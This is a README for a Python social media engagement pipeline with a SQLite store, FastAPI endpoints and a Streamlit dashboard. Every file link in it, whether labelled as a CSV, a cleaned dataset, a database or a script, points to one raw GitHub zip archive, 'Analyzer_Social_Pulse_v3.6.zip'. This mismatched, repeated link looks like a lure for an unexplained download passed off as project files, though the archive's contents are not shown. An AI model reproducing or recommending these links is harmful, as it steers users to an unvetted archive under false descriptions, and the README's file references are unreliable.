📊 Social Pulse Analyzer
🔎 Overview

Social Pulse Analyzer is an end-to-end data pipeline + analytics + visualization project that analyzes social media engagement.

👉 Goal: Help content creators and marketers identify:

Which content drives the highest engagement

On which platform and day their posts perform best

🏗️ Project Workflow
1. Data Ingestion

Generated fake/sample social media posts

Saved raw dataset into CSV (https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip)
📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip

2. Data Cleaning & Feature Engineering

Handled missing values

Created new features:

post_text_length

hashtag_count

hour_of_day

day_of_week

month

Saved results in https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip

3. Database Management

Stored cleaned data in SQLite database (https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip)

Prepared for efficient queries and analysis
📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip

4. Data Analysis

Calculated Engagement Rate:

(likes + comments + shares) / followers


Identified Top 10 posts by engagement

Computed average engagement by platform (Facebook, Twitter, Instagram)

Computed average engagement by day of week
📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip

5. REST API (Backend)

Built using FastAPI

Provides endpoints for:

Top posts

Engagement by platform

Engagement by weekday
📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip

▶️ Run with:

uvicorn main_api:app --reload

6. Interactive Dashboard (Frontend)

Built with Streamlit

Features:

📊 Bar charts

📑 Tables

📈 Engagement trends visualization
📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
🛠️ Tech Stack

Programming: Python (Pandas, NumPy)

Database: SQLite

Backend API: FastAPI + Uvicorn

Frontend Dashboard: Streamlit

🚀 Key Features

✅ Automated pipeline: raw data → cleaned data → database → analysis
✅ REST API for programmatic data access
✅ Streamlit dashboard for interactive visualization
